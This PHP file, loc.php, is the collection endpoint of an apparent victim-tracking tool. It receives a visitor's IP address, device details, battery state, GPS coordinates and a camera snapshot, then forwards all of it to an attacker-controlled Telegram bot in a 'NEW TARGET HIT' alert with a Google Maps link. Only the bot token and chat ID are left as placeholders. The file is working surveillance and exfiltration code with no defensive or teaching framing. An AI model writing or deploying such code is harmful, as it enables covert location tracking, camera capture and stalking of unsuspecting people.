<?php
// language: PHP, file: loc.php, target: Linux (Apache/Nginx)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');
    
    // --- TELEGRAM CONFIGURATION ---
    // REPLACE THESE WITH YOUR ACTUAL BOT TOKEN AND CHAT ID
    $bot_token = "YOUR_BOT_TOKEN_HERE";
    $chat_id = "YOUR_CHAT_ID_HERE";
    
    $msg = "🚨 *NEW TARGET HIT* 🚨\n";
    $msg .= "📅 *Date:* $date\n";
    $msg .= "🌐 *IP:* `$ip`\n\n";
    
    $msg .= "📱 *DEVICE INFO*\n";
    $msg .= "Platform: " . ($data['platform'] ?? 'Unknown') . "\n";
    $msg .= "Screen: " . ($data['screen'] ?? 'Unknown') . "\n";
    $msg .= "Cores: " . ($data['cores'] ?? 'Unknown') . "\n";
    $msg .= "Battery: " . ($data['battery']['level'] ?? 'Unknown') . " (" . ($data['battery']['charging'] ?? 'Unknown') . ")\n\n";
    
    $msg .= "📍 *LOCATION*\n";
    if (isset($data['lat']) && isset($data['lon'])) {
        $msg .= "Lat: `" . $data['lat'] . "`\n";
        $msg .= "Lon: `" . $data['lon'] . "`\n";
        $msg .= "Accuracy: " . $data['acc'] . "m\n";
        $msg .= "[Google Maps](https://www.google.com/maps?q=" . $data['lat'] . "," . $data['lon'] . ")\n";
    } else {
        $msg .= "Location: Denied\n";
    }

    // Send Text Message
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";
    $post_fields = [
        'chat_id' => $chat_id,
        'text' => $msg,
        'parse_mode' => 'Markdown',
        'disable_web_page_preview' => true
    ];
    
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_fields));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // Send Camera Image
    if (isset($data['photo']) && strpos($data['photo'], 'data:image/jpeg;base64,') === 0) {
        $img_data = str_replace('data:image/jpeg;base64,', '', $data['photo']);
        $img_data = str_replace(' ', '+', $img_data);
        $decoded = base64_decode($img_data);
        
        $filename = 'photo_' . date('Ymd_His') . '_' . substr(md5($ip), 0, 6) . '.jpg';
        file_put_contents('/tmp/' . $filename, $decoded); 

        $url = "https://api.telegram.org/bot$bot_token/sendPhoto";
        $post_fields = [
            'chat_id' => $chat_id,
            'caption' => "📸 Camera capture from $ip",
            'photo' => new CURLFile('/tmp/' . $filename)
        ];
        
        $ch = curl_init(); 
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
        
        unlink('/tmp/' . $filename);
    }

    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
    exit();
}
?>
